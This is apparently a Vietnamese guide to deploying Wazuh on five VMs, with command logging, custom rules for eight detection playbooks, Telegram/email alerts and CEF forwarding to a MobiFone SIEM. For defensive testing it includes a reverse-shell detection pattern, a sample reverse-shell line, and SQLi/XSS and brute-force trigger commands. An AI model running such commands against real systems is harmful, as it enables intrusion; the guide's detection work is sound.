# Hướng dẫn cấu hình Wazuh – cmdlog – 8 playbook – forward SIEM MobiFone

**Kiến trúc:** Wazuh Manager trên **Jump (VM 85)**, agent trên **Proxy 01 (VM 66)**, **Proxy 02 (VM 67)**, **App 01 (VM 194)**, **App 02 (VM 195)**; Jump tự giám sát chính nó (agent 000). Manager forward sự kiện **UDP 514 (CEF)** về **SIEM MobiFone**, cảnh báo playbook qua **Telegram / Email**.

> Các giá trị trong `<...>` cần thay bằng giá trị thật.

---

## 1. Chia nhóm agent theo vai trò

Trên Jump:

```bash
/var/ossec/bin/agent_control -l                        # lấy ID của 4 agent
/var/ossec/bin/agent_groups -a -g proxy -q
/var/ossec/bin/agent_groups -a -g app -q
/var/ossec/bin/agent_groups -a -i <ID_Proxy01> -g proxy -q
/var/ossec/bin/agent_groups -a -i <ID_Proxy02> -g proxy -q
/var/ossec/bin/agent_groups -a -i <ID_App01>   -g app   -q
/var/ossec/bin/agent_groups -a -i <ID_App02>   -g app   -q
/var/ossec/bin/agent_groups -l                         # mỗi agent thuộc default + proxy/app
```

**Lưu ý "đủ 5 agent":** Jump chạy Wazuh **manager**, nên nó tự giám sát chính mình dưới tên agent **000**. Không cài thêm agent riêng lên Jump được, vì sẽ xung đột với manager. Nếu dashboard không liệt kê agent 000 trong danh sách Agents, bằng chứng đủ 5 gồm:

- ảnh danh sách **4 agent Active**, và
- ảnh màn hình Discover lọc `agent.id:000`, thấy log của Jump.

---

## 2. Thu thập log trên cả 5 VM (66, 67, 194, 195, 85)

### 2.1. Snoopy ghi mọi lệnh thành một dòng dễ đọc

```bash
apt install -y snoopy          # khi được hỏi bật snoopy thì chọn Yes (nếu đã cài: snoopy-enable)
```

Ghi nội dung `/etc/snoopy.ini`:

```ini
[snoopy]
message_format = "[login:%{login} uid:%{uid} sid:%{sid} tty:%{tty} cwd:%{cwd} filename:%{filename}]: %{cmdline}"
filter_chain = ""
output = devlog
syslog_facility = LOG_LOCAL5
syslog_ident = cmdlog
```

> Snoopy hoạt động bằng cách ghi thư viện của nó vào `/etc/ld.so.preload`. Nội dung hợp lệ là dòng `/lib/x86_64-linux-gnu/libsnoopy.so`. Nếu file có dòng nào **khác** thì phải điều tra.

### 2.2. rsyslog tách log lệnh ra file riêng

Tạo `/etc/rsyslog.d/30-cmdlog.conf`:

```
local5.*    /var/log/cmdlog.log
& stop
```

Tạo `/etc/logrotate.d/cmdlog`:

```
/var/log/cmdlog.log {
    daily
    rotate 90
    compress
    missingok
    notifempty
    create 0640 syslog adm
    postrotate
        /usr/lib/rsyslog/rsyslog-rotate
    endscript
}
```

```bash
systemctl restart rsyslog
id; ls /tmp                    # chạy thử vài lệnh
tail -5 /var/log/cmdlog.log
```

Kết quả mẫu:

```
Nov 13 11:05:01 app01 cmdlog[23451]: [login:hunghv uid:0 sid:2210 tty:/dev/pts/0 cwd:/root filename:/usr/bin/id]: id
```

### 2.3. auditd: ghi mọi lệnh do người dùng thật chạy (kể cả sau khi sudo)

```bash
apt install -y auditd
cat > /etc/audit/rules.d/wazuh.rules <<'EOF'
## Lệnh do người dùng đăng nhập chạy (auid = user thật, kể cả sau khi sudo)
-a always,exit -F arch=b64 -S execve -F auid>=1000 -F auid!=-1 -k audit-wazuh-c
-a always,exit -F arch=b32 -S execve -F auid>=1000 -F auid!=-1 -k audit-wazuh-c
## Thay đổi tài khoản / sudo
-w /etc/passwd  -p wa -k identity
-w /etc/shadow  -p wa -k identity
-w /etc/sudoers -p wa -k identity
-w /etc/sudoers.d/ -p wa -k identity
EOF
augenrules --load && auditctl -l
```

Key `audit-wazuh-c` có sẵn trong danh sách của Wazuh. Mỗi lệnh sẽ tự sinh **rule 80792 "Audit: Command: …"**, nên không cần viết thêm rule.

---

## 3. Cấu hình agent theo nhóm (trên Jump)

### 3.1. `/var/ossec/etc/shared/default/agent.conf` (áp dụng cho cả 4 agent)

```xml
<agent_config>
  <localfile>
    <log_format>syslog</log_format>
    <location>/var/log/cmdlog.log</location>
  </localfile>
  <localfile>
    <log_format>audit</log_format>
    <location>/var/log/audit/audit.log</location>
  </localfile>
  <syscheck>
    <directories realtime="yes" check_all="yes">/root/.ssh,/home/*/.ssh</directories>
    <directories realtime="yes" check_all="yes">/etc/crontab,/etc/cron.d,/var/spool/cron,/etc/systemd/system</directories>
    <directories realtime="yes" check_all="yes">/etc/sudoers,/etc/sudoers.d,/etc/ld.so.preload,/etc/rc.local</directories>
  </syscheck>
</agent_config>
```

### 3.2. `/var/ossec/etc/shared/proxy/agent.conf` (VM 66, 67)

```xml
<agent_config>
  <localfile>
    <log_format>apache</log_format>
    <location>/var/log/nginx/access.log</location>
  </localfile>
  <localfile>
    <log_format>syslog</log_format>
    <location>/var/log/nginx/error.log</location>
  </localfile>
  <syscheck>
    <directories realtime="yes" check_all="yes">/etc/nginx</directories>
  </syscheck>
</agent_config>
```

Nếu Nginx ghi log ra file riêng cho từng site (ví dụ `/var/log/nginx/*_access.log`), dùng đường dẫn có wildcard thay cho `access.log`.

### 3.3. `/var/ossec/etc/shared/app/agent.conf` (VM 194, 195)

```xml
<agent_config>
  <localfile>
    <log_format>syslog</log_format>
    <location>/var/log/mysql/error.log</location>
  </localfile>
  <!-- Log ứng dụng ICPASS (sửa đúng đường dẫn) -->
  <!-- <localfile><log_format>syslog</log_format><location>/opt/icpass/logs/*.log</location></localfile> -->
  <syscheck>
    <directories realtime="yes" check_all="yes">/etc/mysql</directories>
  </syscheck>
</agent_config>
```

Trên App, kiểm tra đường dẫn log lỗi và mức log của MariaDB:

```bash
mysql -e "SHOW VARIABLES LIKE 'log_error'; SHOW VARIABLES LIKE 'log_warnings';"
```

Cần `log_warnings` ≥ 2 thì MariaDB mới ghi các lần "Access denied". Nếu thấp hơn, thêm `log_warnings=2` vào `/etc/mysql/mariadb.conf.d/50-server.cnf` rồi restart MariaDB.

Kiểm tra cú pháp các file vừa tạo:

```bash
/var/ossec/bin/verify-agent-conf
```

### 3.4. Riêng Jump (agent 000)

Cấu hình nhóm **không** áp dụng cho manager. Thêm trực tiếp vào `/var/ossec/etc/ossec.conf` của Jump:

- 2 khối `<localfile>` (cmdlog và audit), giống trong `default/agent.conf`.
- Các dòng `<directories>` vào khối `<syscheck>` đã có sẵn.

---

## 4. Decoder và rule cho 8 playbook (trên Jump)

### 4.1. `/var/ossec/etc/decoders/local_decoder.xml`

```xml
<decoder name="cmdlog">
  <program_name>^cmdlog$</program_name>
</decoder>

<decoder name="cmdlog-fields">
  <parent>cmdlog</parent>
  <regex type="pcre2">^\[login:(\S+) uid:(\d+) sid:(\d+) tty:(\S+) cwd:(\S+) filename:(\S+)\]: (.+)$</regex>
  <order>srcuser,uid,sid,tty,cwd,filename,command</order>
</decoder>
```

### 4.2. `/var/ossec/etc/rules/local_rules.xml`

```xml
<!-- ===== CMDLOG (snoopy) ===== -->
<group name="local,cmdlog,">
  <rule id="100100" level="3">
    <decoded_as>cmdlog</decoded_as>
    <description>CMDLOG: $(srcuser) (uid=$(uid)) chạy lệnh: $(command)</description>
  </rule>
  <!-- PB8 -->
  <rule id="100270" level="13">
    <if_sid>100100</if_sid>
    <field name="command" type="pcre2">(?i)(/dev/tcp/|/dev/udp/|\bncat\b|\bsocat\b|\bnc\b.*\s-[a-z]*e\b|bash\s+-i|\bsh\s+-i|base64\s+(-d|--decode)|(curl|wget)[^|]*\|\s*(ba|z|da)?sh|chmod\s+\+x\s+/(tmp|dev/shm|var/tmp))</field>
    <description>PB8: Lệnh nghi reverse shell/tải mã độc bởi $(srcuser): $(command)</description>
    <mitre><id>T1059.004</id></mitre>
  </rule>
</group>

<!-- ===== SSH / USER / SUDO ===== -->
<group name="local,authentication,">
  <!-- PB2 -->
  <rule id="100230" level="12">
    <if_sid>5715</if_sid>
    <user>root</user>
    <description>PB2: Đăng nhập SSH thành công bằng ROOT từ $(srcip)</description>
    <mitre><id>T1078</id></mitre>
  </rule>
  <!-- PB3 -->
  <rule id="100240" level="12">
    <if_sid>5902</if_sid>
    <description>PB3: Tài khoản mới được tạo trên hệ thống</description>
    <mitre><id>T1136.001</id></mitre>
  </rule>
  <!-- PB4 -->
  <rule id="100250" level="10">
    <if_sid>5402</if_sid>
    <description>PB4: $(srcuser) sudo lên ROOT</description>
    <mitre><id>T1548.003</id></mitre>
  </rule>
</group>

<!-- ===== NGINX (Proxy 66/67) ===== -->
<group name="local,web,">
  <!-- PB5 -->
  <rule id="100300" level="12">
    <if_sid>31103,31104,31105</if_sid>
    <description>PB5: Tấn công web (SQLi/XSS/LFI) vào Nginx từ $(srcip): $(url)</description>
    <mitre><id>T1190</id></mitre>
  </rule>
</group>

<!-- ===== MARIADB (App 194/195) ===== -->
<group name="local,mysql,">
  <rule id="100310" level="5">
    <location>/var/log/mysql/error.log</location>
    <match>Access denied for user</match>
    <description>MariaDB: đăng nhập DB thất bại</description>
  </rule>
  <!-- PB6 -->
  <rule id="100311" level="12" frequency="5" timeframe="120">
    <if_matched_sid>100310</if_matched_sid>
    <same_location />
    <description>PB6: Brute-force MariaDB (≥5 lần sai mật khẩu trong 2 phút)</description>
    <mitre><id>T1110</id></mitre>
  </rule>
</group>

<!-- ===== FIM ===== -->
<group name="local,syscheck,">
  <!-- PB7 -->
  <rule id="100260" level="12">
    <if_sid>550,553,554</if_sid>
    <field name="file" type="pcre2">authorized_keys|/etc/crontab|/etc/cron\.d|/var/spool/cron|/etc/systemd/system/|ld\.so\.preload|/etc/sudoers|/etc/rc\.local|/etc/nginx/|/etc/mysql/</field>
    <description>PB7: Thay đổi file nhạy cảm/persistence: $(file)</description>
    <mitre><id>T1098.004</id><id>T1053.003</id></mitre>
  </rule>
</group>
```

PB1 (SSH brute-force) dùng rule có sẵn **5712 / 5763**.

### 4.3. Kiểm tra rồi restart

```bash
/var/ossec/bin/wazuh-logtest
# dán dòng sau rồi Enter:
# Nov 13 11:05:01 app01 cmdlog[2345]: [login:hunghv uid:0 sid:2210 tty:/dev/pts/0 cwd:/root filename:/usr/bin/bash]: bash -i >& /dev/tcp/1.2.3.4/4444 0>&1
# → phải ra rule 100270, level 13
systemctl restart wazuh-manager
```

### 4.4. Cảnh báo Email

Wazuh không hỗ trợ SMTP có đăng nhập. Vì vậy cài **postfix làm relay** trên Jump (`apt install postfix`, chọn *Satellite system*, trỏ tới mail server của công ty), rồi sửa trong `ossec.conf` (khối `<global>` đã có sẵn, chỉ sửa các dòng tương ứng, không thêm khối thứ hai):

```xml
  <global>
    <email_notification>yes</email_notification>
    <smtp_server>localhost</smtp_server>
    <email_from><wazuh@domain></email_from>
    <email_to><email_SOC></email_to>
    <email_maxperhour>60</email_maxperhour>
  </global>

  <alerts>
    <log_alert_level>3</log_alert_level>
    <email_alert_level>10</email_alert_level>
  </alerts>
```

Cả 8 playbook đều có level ≥ 10 nên đều gửi mail.

### 4.5. Cảnh báo Telegram

**Tạo bot:** nhắn @BotFather → `/newbot` → lấy **TOKEN**. Thêm bot vào group SOC. Lấy **chat_id** bằng cách mở `https://api.telegram.org/bot<TOKEN>/getUpdates` (ID của group có dạng `-100...`).

Ghi nội dung `/var/ossec/integrations/custom-telegram`:

```python
#!/var/ossec/framework/python/bin/python3
import sys, json, requests

alert_file, chat_id, hook_url = sys.argv[1], sys.argv[2], sys.argv[3]
with open(alert_file) as f:
    a = json.load(f)

r = a.get("rule", {}); ag = a.get("agent", {}); d = a.get("data", {})
text = (
    f"🚨 *WAZUH* | Level {r.get('level')}\n"
    f"*Rule:* {r.get('id')} – {r.get('description')}\n"
    f"*Agent:* {ag.get('name')} ({ag.get('ip','-')})\n"
    f"*Thời gian:* {a.get('timestamp')}\n"
)
if d.get("srcip"): text += f"*Src IP:* {d['srcip']}\n"
if a.get("syscheck", {}).get("path"): text += f"*File:* `{a['syscheck']['path']}`\n"
text += f"```\n{a.get('full_log','')[:700]}\n```"

requests.post(hook_url, json={"chat_id": chat_id, "text": text, "parse_mode": "Markdown"}, timeout=10)
```

```bash
chown root:wazuh /var/ossec/integrations/custom-telegram
chmod 750 /var/ossec/integrations/custom-telegram
```

Thêm vào `ossec.conf`:

```xml
  <integration>
    <name>custom-telegram</name>
    <hook_url>https://api.telegram.org/bot<TOKEN>/sendMessage</hook_url>
    <api_key><CHAT_ID></api_key>
    <rule_id>5712,5763,100230,100240,100250,100300,100311,100260,100270</rule_id>
    <alert_format>json</alert_format>
  </integration>
```

```bash
systemctl restart wazuh-manager
tail -f /var/ossec/logs/integrations.log      # xem lỗi nếu không nhận được tin
```

Máy Jump cần đi ra được `api.telegram.org:443`.

---

## 5. Forward về SIEM MobiFone (UDP 514, CEF)

Thêm vào `/var/ossec/etc/ossec.conf` trên Jump:

```xml
  <syslog_output>
    <server><IP_SIEM_MBF></server>
    <port>514</port>
    <format>cef</format>
    <level>3</level>
  </syslog_output>
```

```bash
/var/ossec/bin/wazuh-control enable client-syslog
systemctl restart wazuh-manager
tcpdump -nni any -A udp port 514 and host <IP_SIEM_MBF> | head -20     # thấy chuỗi "CEF:0|Wazuh|..."
```

`level 3` gửi đi cả log lệnh (80792 từ auditd, 100100 từ snoopy) lẫn toàn bộ cảnh báo playbook.

**Phía SIEM MBF không cần cấu hình gì từ phía mình.** Gửi cho bên MobiFone các thông tin sau để họ mở firewall và tạo bộ phân tích log:

- IP nguồn: **Jump (VM 85)**
- Giao thức: **UDP 514**
- Định dạng: **CEF**, vendor `Wazuh`
- Nhờ họ chụp lại màn hình phía SIEM khi đã nhận được event, làm bằng chứng cho phần forward.

---

## 6. Bảng 8 playbook

| # | Playbook | Rule ID | Level | Máy áp dụng | Cách kích hoạt | Ảnh cảnh báo |
|---|---|---|---|---|---|---|
| 1 | SSH brute-force | **5712 / 5763** | 10 | Cả 5 | Từ máy khác: `for i in $(seq 1 10); do ssh -o PreferredAuthentications=password -o StrictHostKeyChecking=no fakeuser@<IP> exit; done` (gõ sai mật khẩu) | |
| 2 | Đăng nhập SSH bằng root | **100230** | 12 | Cả 5 | `ssh root@<IP>` | |
| 3 | Tạo tài khoản mới | **100240** | 12 | Cả 5 | `useradd wz_test && userdel wz_test` | |
| 4 | sudo lên root | **100250** | 10 | Cả 5 | Đăng nhập user thường → `sudo -i` | |
| 5 | Tấn công web vào Nginx | **100300** | 12 | Proxy 66, 67 | `curl "http://<IP_proxy>/?id=1%27%20UNION%20SELECT%201,2--"` và `curl "http://<IP_proxy>/?q=<script>alert(1)</script>"` | |
| 6 | Brute-force MariaDB | **100311** | 12 | App 194, 195 | `for i in $(seq 1 6); do mysql -u wz_test -pSai123 -h 127.0.0.1 -e 'select 1' 2>/dev/null; done` | |
| 7 | Sửa file nhạy cảm / persistence | **100260** | 12 | Cả 5 | `touch /etc/cron.d/wz_test` → chờ cảnh báo → `rm /etc/cron.d/wz_test` | |
| 8 | Lệnh reverse shell / tải mã độc | **100270** | 13 | Cả 5 | `bash -c 'echo test > /dev/tcp/127.0.0.1/9' 2>/dev/null` | |

Xem cảnh báo trực tiếp trên Jump:

```bash
tail -f /var/ossec/logs/alerts/alerts.json | jq -c '{id:.rule.id, lvl:.rule.level, agent:.agent.name, desc:.rule.description}'
```

Mỗi playbook chụp một ảnh tin Telegram hoặc email, kèm màn hình Discover lọc `rule.id:<ID>`.

---

## 7. Xác nhận không dùng container

Chạy trên cả 5 VM và chụp kết quả:

```bash
echo "== $(hostname)"
for c in docker dockerd containerd podman crictl kubelet runc lxc; do printf '%-11s ' $c; command -v $c || echo "không có"; done
systemctl list-unit-files 2>/dev/null | grep -Ei 'docker|containerd|podman|kubelet|lxd' || echo "Không có service container"
ls /var/run/docker.sock /run/containerd/containerd.sock 2>&1
snap list 2>/dev/null | grep -i lxd || echo "Không có snap LXD"
echo "Chạy trong container? $(systemd-detect-virt --container)"      # 'none' = không
```

Trên cả 5 VM, kết quả phải là "không có" ở mọi dòng và `none` ở dòng cuối. Đó là cơ sở cho kết luận "không dùng container nên không triển khai Falco".

---

## 8. Checklist ảnh cần nộp

- [ ] Dashboard Agents: **4 agent Active** + Discover `agent.id:000` (Jump) = đủ 5
- [ ] `tail -f /var/log/cmdlog.log` trên một VM, thấy từng lệnh
- [ ] Discover lọc `rule.id:80792 OR rule.id:100100`, thấy log lệnh của cả 5 máy
- [ ] `tcpdump` thấy gói CEF đi tới SIEM, hoặc ảnh phía SIEM MBF do họ gửi
- [ ] 8 ảnh cảnh báo Telegram/Email, mỗi playbook một ảnh
- [ ] Ảnh kiểm tra container trên 5 VM

Nếu playbook nào không ra cảnh báo, lấy dòng log gốc trên agent (ví dụ một dòng `Access denied` trong log MariaDB, hoặc một dòng access log của Nginx) rồi chạy `wazuh-logtest` để chỉnh rule cho khớp.